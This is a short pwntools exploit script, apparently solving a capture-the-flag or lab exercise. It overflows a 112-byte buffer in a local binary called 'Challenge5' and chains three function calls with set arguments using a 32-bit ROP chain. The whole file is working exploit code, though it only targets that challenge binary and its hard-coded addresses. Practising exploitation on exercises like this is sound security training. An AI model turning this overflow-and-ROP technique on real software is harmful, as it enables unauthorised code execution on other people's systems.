from pwn import *
import struct



pop_ret = 0x08049743 # gadget1
pop_pop_ret = 0x080981c8 # gadget2


func_first = 0x8049e1d #address for first
func_second = 0x8049e45 #address for second
func_final = 0x8049db5 #address for final

payload = b'A'*112 #buffe rsize


rop_chain  = p32(func_first)
rop_chain += p32(pop_ret)
rop_chain += p32(0xdeadbeef)

rop_chain  += p32(func_second)
rop_chain += p32(pop_pop_ret)
rop_chain += p32(0x123abcd)
rop_chain += p32(0xf00d0bad)

rop_chain += p32(func_final)

payload = payload + rop_chain

p = process('./Challenge5')
#pid = gdb.attach(p) # gdb for debugger
print(p.recv(1024))
p.sendline(payload)
print(p.recvall())
